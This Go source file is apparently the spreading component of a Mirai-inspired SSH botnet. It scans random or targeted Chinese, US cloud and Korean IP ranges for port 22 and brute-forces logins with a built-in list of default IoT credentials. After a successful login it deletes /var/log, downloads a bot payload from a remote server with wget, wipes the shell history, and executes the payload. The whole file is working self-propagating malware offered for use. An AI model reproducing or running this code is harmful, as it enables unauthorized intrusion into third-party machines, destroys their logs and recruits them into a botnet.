package lib

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	ScanSwitch bool
	random     string // 0.0.0.0/0
)

var CN_netList = []string{

	//CHINANET Hubei province network.

	"116.211", // 116.211.0.0/16
	"119.96",  // 119.96.0.0/16
	"119.97",  // 119.97.0.0/16
	"119.102", // 119.102.0.0/16
	"58.49",   // 58.49.0.0/16
	"58.53",   // 58.53.0.0/16
	"221.234", // 221.234.0.0/16
	"221.235", // 221.235.0.0/16

	//CHINANET Guangdong province network.

	"14.116", // 14.116.0.0/16
	"14.118", // 14.118.0.0/16
	"14.127", // 14.127.0.0/16
	"14.29",  // 14.29.0.0/16
	"121.14", // 121.14.0.0/16

	//CHINANET Jiangsu province network.

	"49.70",   // 49.70.0.0/16
	"114.230", // 114.230.0.0/16
	"114.239", // 114.239.0.0/16
	"117.93",  // 117.93.0.0/16
	"121.131", // 121.131.0.0/16

	//CHINANET shandong province network.

	"140.246", // 140.246.0.0/16
	"140.250", //140.250.0.0/16
	"182.42",  // 182.42.0.0/16
	"182.43",  // 182.43.0.0/16

	//China TieTong Telecommunications Corporation.

	"36.212",  // 36.212.0.0/16
	"36.208",  // 36.208.0.0/16
	"36.209",  // 36.209.0.0/16
	"110.218", // 110.218.0.0/16
	"110.219", // 110.219.0.0/16
	"110.101", // 110.101.0.0/16
	"110.105", // 110.105.0.0/16
	"122.88",  // 122.88.0.0/16
	"122.94",  // 122.94.0.0/16
	"122.95",  // 122.95.0.0/16
}

var USA_netList = []string{

	//Amazon.com, Inc.

	"44.194", // 44.194.0.0/16
	"44.235", // 44.235.0.0/16
	"18.188", // 18.188.0.0/16
	"18.191", // 18.191.0.0/16
	"18.212", // 18.212.0.0/16
	"18.217", // 18.217.0.0/16
	"18.220", // 18.220.0.0/16
	"18.222", // 18.222.0.0/16
	"18.233", // 18.233.0.0/16
	"54.83",  // 54.83.0.0/16
	"54.86",  // 54.86.0.0/16
	"54.214", // 54.214.0.0/16
	"54.162", // 54.162.0.0/16

	//DigitalOcean, LLC

	"64.225",  // 64.225.0.0/16
	"64.62",   // 64.62.0.0/16
	"64.90",   // 64.90.0.0/16
	"104.198", // 104.198.0.0/16
	"104.248", // 104.248.0.0/16
	"35.188",  // 35.188.0.0/16
	"35.194",  // 35.194.0.0/16
	"35.202",  // 35.202.0.0/16
	"35.224",  // 35.224.0.0/16
	"35.233",  // 35.233.0.0/16
	"35.239",  // 35.239.0.0/16
	"34.68",   // 34.68.0.0/16
	"34.72",   // 34.72.0.0/16
	"34.138",  // 34.138.0.0/16
	"165.227", // 165.227.0.0/16

	//Google LLC

	"35.188",  // 35.188.0.0/16
	"35.192",  // 35.192.0.0/16
	"35.239",  // 35.239.0.0/16
	"35.243",  // 35.243.0.0/16
	"34.70",   // 34.70.0.0/16
	"34.133",  // 34.133.0.0/16
	"34.136",  // 34.136.0.0/16
	"104.154", // 104.154.0.0/16
	"104.197", // 104.197.0.0/16
}

var KR_netList = []string{

	//Korea Telecom

	"14.61",   // 14.61.0.0/16
	"218.155", // 218.155.0.0/16
	"27.236",  // 27.236.0.0/16
	"27.238",  // 27.238.0.0/16
	"125.153", // 125.153.0.0/16
	"125.157", // 125.157.0.0/16
	"119.212", // 119.212.0.0/16
	"119.221", // 119.221.0.0/16
	"175.239", // 175.239.0.0/16
	"175.203", // 175.203.0.0/16

	//SK Broadband, Inc.

	"58.122",  // 58.122.0.0/16
	"58.124",  // 58.124.0.0/16
	"118.221", // 118.221.0.0/16
	"118.218", // 118.218.0.0/16
	"211.201", // 211.201.0.0/16
	"211.54",  // 211.54.0.0/16
	"218.38",  // 218.38.0.0/16
	"218.101", // 218.101.0.0/16
	"175.112", // 175.112.0.0/16
	"175.114", // 175.114.0.0/16
	"175.124", // 175.124.0.0/16
	"1.234",   // 1.234.0.0/16
	"1.235",   // 1.235.0.0/16

	//LG DACOM Corporation

	"211.60",  // 211.60.0.0/16
	"112.216", // 112.216.0.0/16
	"112.217", // 112.217.0.0/16
	"122.221", // 112.221.0.0/16
	"123.143", // 123.143.0.0/16
	"106.242", // 106.242.0.0/16
	"106.245", // 106.245.0.0/16
	"1.211",   // 1.211.0.0/16
	"1.215",   // 1.215.0.0/16
	"118.130", // 118.130.0.0/16
	"58.149",  // 58.149.0.0/16

	//LGTELECOM

	"223.171", // 223.171.0.0/16
}

var Random_netList = []string{random}

func genRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func (b *Bot) manageRange() string {
	var ipGen []string
	ipGen = append(ipGen, b.network)
	ipGen = append(ipGen, ".")

	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, genRange(255, 0), ".")
	}

	ipGen[len(ipGen)-1] = ""
	ipGen = append(ipGen, ":22")
	return ipGen[0] + ipGen[1] + ipGen[2] + ipGen[3] +
		ipGen[4] + ipGen[5] + ipGen[6]
}

func checkPort(_ip string) string {
	ptrIP := &_ip
	conn, err := net.DialTimeout("tcp", *ptrIP, 1*time.Second)
	if err != nil {
		return ""
	}
	conn.Close()
	return *ptrIP
}

func sshConfig(sshName, sshPass string) *ssh.ClientConfig {
	config := &ssh.ClientConfig{
		User: sshName,
		Auth: []ssh.AuthMethod{
			ssh.Password(sshPass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return config
}

func (b *Bot) sshExecute(comd string) {
	sshSession, _ := b.session.NewSession()
	var setSession bytes.Buffer
	sshSession.Stdout = &setSession
	sshSession.Run("echo " + b.password + " | sudo -S " + comd)
	sshSession.Close()
}

func (b *Bot) Scanner(modes []string, isRandom bool) {
	/*
		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
		Add more usernames and passwords in to The slice name "userList" and "paswdList".
	*/
	userList := []string{
		"admin", "root", "user", "guest", "support", "login", "ubnt",
	}
	paswdList := []string{
		"", "admin", "root", "user", "guest", "support", "login", "password",
		"ubnt", "default", "1234", "12345", "123456", "12345678", "123456789", "1234567890",
		"pass", "54321", "123123", "888888", "666666", "00000000", "1111", "111111",
		"1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "hi3518", "admin1234",
		"jvbzd", "klv123", "klv1234", "xc3511", "vizxv", "xmhdipc", "Zte521", "7ujMko0admin",
		"7ujMko0vizxv",
	}

	for {
		for net := range modes {
			if isRandom {
				gen := genRange(255, 0) + "." + genRange(255, 0)
				//Blacklists IP
				if gen == "127." || gen == "0." || gen == "3." || gen == "15." || gen == "56." || gen == "10." || gen == "192." || gen == "172." ||
					gen == "100." || gen == "169." || gen == "198." || gen == "224." || gen == "6" || gen == "7" || gen == "11" || gen == "21" ||
					gen == "22" || gen == "26" || gen == "28" || gen == "29" || gen == "30" || gen == "33" || gen == "55" || gen == "214" || gen == "215" {
					continue
				}
				Random_netList[0] = gen
			}
			b.network = modes[net]
			ip := b.manageRange()
			_ptrIP := &ip
			rtnIP := checkPort(*_ptrIP)

			if rtnIP == "" {
				checkPort(ip)
			} else {
				b.Report("Try to login: " + rtnIP)
				var isLogin bool
				for user := range userList {
					for paswd := range paswdList {
						if isLogin || ScanSwitch {
							break
						}
						sshConn, err := ssh.Dial("tcp", rtnIP, sshConfig(userList[user], paswdList[paswd]))
						b.session = sshConn
						b.password = paswdList[paswd]
						if err == nil {
							b.payload = name('a')
							b.Report("Login success: " + rtnIP)
							b.sshExecute("rm -rf /var/log/; wget -O ." + b.payload + " " + b.pServer + "; history -c; rm ~/.bash_history")
							b.Report("Installing bot: " + rtnIP)
							go b.sshExecute("chmod 700 ." + b.payload + " && ./." + b.payload)
							isLogin = true
						} else {
							b.Report("Failed to login: " + rtnIP + " > " + fmt.Sprintf("%v:%v", userList[user], paswdList[paswd]))
						}
					}
				}
				continue
			}
		}
		if ScanSwitch {
			b.Report("STOP SCANNING.")
			break
		}
	}
}

func (b *Bot) ScanMode(modes, server string) {
	b.pServer = server
	switch {
	case modes == "-usa":
		b.Scanner(USA_netList, false)
	case modes == "-cn":
		b.Scanner(CN_netList, false)
	case modes == "-kr":
		b.Scanner(KR_netList, false)
	case modes == "-r":
		b.Scanner(Random_netList, true)
	}
}
